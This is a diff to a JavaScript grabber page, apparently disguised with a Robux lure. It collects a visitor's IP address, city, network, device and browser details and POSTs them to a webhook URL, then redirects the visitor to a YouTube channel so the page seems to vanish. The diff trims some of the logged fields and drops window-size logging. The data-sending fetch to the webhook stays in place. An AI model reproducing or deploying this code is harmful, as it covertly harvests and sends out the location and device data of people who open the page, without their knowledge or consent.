@@ -100,12 +100,8 @@
 
               logRobux1(ip);
               var message = {
-                content: "> Information\n> Opened on: **" + formattedDate + "**\n> IP address: **" + ip + "**\n> City: **" + city + "**\n> Network: **" + network + "**\n> Version: **" + version + "**\n> Country Calling Code: **" + countryCallingCode + "**\n> Device: **" + platform + "**\n> Browser Name: **" + detector.name + "**\n> Platform Name: **" + detector.platform + "**\n""**\n> Screen Width: **" + screen.width + "**px\n> Screen Height: **" + screen.height + "**px"
+                content: "> Information\n> Opened on: **" + formattedDate + "**\n> IP address: **" + ip + "**\n> City: **" + city + "**\n> Network: **" + network + "**\n> Version: **" + version + "**\n> Country Calling Code: **" + countryCallingCode + "**\n> Device: **" + platform + "**"
               };
-
-              if (screen.width !== window.width || screen.height !== window.height) {
-                message.content += "\n> Window Width: **" + window.outerWidth + "**px\n> Window Height: **" + window.outerHeight + "**px";
-              }
 
               fetch(webhookURL, {
                 method: "POST",
@@ -135,10 +131,10 @@
         });
     }
 
-    function vanish() {
+function vanish() {
       window.location.replace("https://www.youtube.com/channel/UC8HNlWyhuqQzVNqCAP2t_mw");
     }
-
+    
     function getPlatform() {
       var platform = navigator.platform.toLowerCase();
       if (platform.includes("win")) {
